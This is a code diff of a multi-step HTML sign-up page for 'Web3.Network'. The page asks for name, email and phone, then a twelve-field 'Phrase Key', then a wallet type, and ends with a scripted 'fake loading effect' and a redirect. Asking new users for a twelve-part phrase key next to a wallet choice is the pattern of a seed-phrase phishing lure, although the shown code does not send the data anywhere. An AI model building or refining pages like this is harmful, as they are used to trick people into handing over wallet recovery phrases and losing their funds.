@@ -1,81 +1,202 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Sign Up | Web3.Network</title>
-  <link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web3.Network – Sign Up</title>
+
+<style>
+* {
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  margin: 0;
+  height: 100vh;
+  background: linear-gradient(135deg, #0f3d2e, #1b7a5c);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  color: #fff;
+}
+
+.container {
+  width: 100%;
+  max-width: 420px;
+  background: #0b2f24;
+  padding: 25px;
+  border-radius: 12px;
+  box-shadow: 0 0 30px rgba(0,0,0,0.4);
+}
+
+h1 {
+  text-align: center;
+  margin-bottom: 5px;
+}
+
+p {
+  text-align: center;
+  font-size: 14px;
+  opacity: 0.8;
+}
+
+.step {
+  display: none;
+}
+
+.step.active {
+  display: block;
+}
+
+input, select {
+  width: 100%;
+  padding: 12px;
+  margin-top: 12px;
+  border-radius: 6px;
+  border: none;
+  font-size: 15px;
+}
+
+.buttons {
+  display: flex;
+  justify-content: space-between;
+  margin-top: 20px;
+}
+
+button {
+  padding: 12px 18px;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  font-weight: bold;
+}
+
+.next {
+  background: #1ecb8b;
+  color: #000;
+}
+
+.back {
+  background: #555;
+  color: #fff;
+}
+
+.create {
+  width: 100%;
+  background: #1ecb8b;
+  color: #000;
+  margin-top: 20px;
+}
+
+.security-grid {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 8px;
+  margin-top: 12px;
+}
+
+.security-grid input {
+  text-align: center;
+  font-weight: bold;
+}
+</style>
 </head>
-<body class="auth-bg">
 
-<div class="signup-container">
+<body>
 
-  <h2>Web3.Network</h2>
+<div class="container">
+  <h1>Web3.Network</h1>
   <p>Create your account</p>
 
   <!-- STEP 1 -->
   <div class="step active">
-    <input type="text" id="name" placeholder="Full Name">
-    <div class="nav-btns">
-      <button type="button" class="next-btn">Next</button>
+    <input type="text" placeholder="Full Name">
+    <div class="buttons">
+      <span></span>
+      <button class="next" onclick="nextStep()">Next</button>
     </div>
   </div>
 
   <!-- STEP 2 -->
   <div class="step">
-    <input type="email" id="email" placeholder="Email Address">
-    <div class="nav-btns">
-      <button type="button" class="prev-btn">Back</button>
-      <button type="button" class="next-btn">Next</button>
+    <input type="email" placeholder="Email Address">
+    <div class="buttons">
+      <button class="back" onclick="prevStep()">Back</button>
+      <button class="next" onclick="nextStep()">Next</button>
     </div>
   </div>
 
   <!-- STEP 3 -->
   <div class="step">
-    <input type="tel" id="phone" placeholder="Phone Number">
-    <div class="nav-btns">
-      <button type="button" class="prev-btn">Back</button>
-      <button type="button" class="next-btn">Next</button>
+    <input type="tel" placeholder="Phone Number">
+    <div class="buttons">
+      <button class="back" onclick="prevStep()">Back</button>
+      <button class="next" onclick="nextStep()">Next</button>
     </div>
   </div>
 
-  <!-- STEP 4: SECURITY CODE -->
+  <!-- STEP 4 -->
   <div class="step">
-    <input type="text" id="phrase key" placeholder="Phrase Key">
     <p>Phrase Key</p>
     <div class="security-grid">
-      <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
-      <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
-      <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
+      <input maxlength="3"><input maxlength="3"><input maxlength="3"><input maxlength="3">
+      <input maxlength="3"><input maxlength="3"><input maxlength="3"><input maxlength="3">
+      <input maxlength="3"><input maxlength="3"><input maxlength="3"><input maxlength="3">
     </div>
-    <div class="nav-btns">
-      <button type="button" class="prev-btn">Back</button>
-      <button type="button" class="next-btn">Next</button>
+    <div class="buttons">
+      <button class="back" onclick="prevStep()">Back</button>
+      <button class="next" onclick="nextStep()">Next</button>
     </div>
   </div>
 
-  <!-- STEP 5: WALLET TYPE -->
+  <!-- STEP 5 -->
   <div class="step">
-    <select id="wallet">
-      <option>Select Wallet Type</option>
+    <select>
+      <option value="">Select Wallet Type</option>
       <option>Ethereum</option>
       <option>Solana</option>
       <option>Bitcoin</option>
-      <option>Trust Wallet</option>
-      <option>Polygon</option>
+      <option>BNB</option>
     </select>
-    <div class="nav-btns">
-      <button type="button" class="prev-btn">Back</button>
-      <button type="button" id="createAccountBtn">Create Account</button>
-    </div>
-  </div>
-  
-  <!-- LOADING -->
-  <div class="step" id="loading">
-    <p>Creating your account…</p>
+
+    <button class="create" onclick="createAccount()">Create Account</button>
   </div>
 
 </div>
 
-<script src="signup.js"></script>
+<script>
+let currentStep = 0;
+const steps = document.querySelectorAll(".step");
+
+function showStep(index) {
+  steps.forEach(step => step.classList.remove("active"));
+  steps[index].classList.add("active");
+}
+
+function nextStep() {
+  if (currentStep < steps.length - 1) {
+    currentStep++;
+    showStep(currentStep);
+  }
+}
+
+function prevStep() {
+  if (currentStep > 0) {
+    currentStep--;
+    showStep(currentStep);
+  }
+}
+
+function createAccount() {
+  // fake loading effect
+  document.body.innerHTML = "<h2 style='color:white'>Creating your account...</h2>";
+
+  setTimeout(() => {
+    window.location.href = "dashboard.html";
+  }, 2000);
+}
+</script>
+
 </body>
 </html>
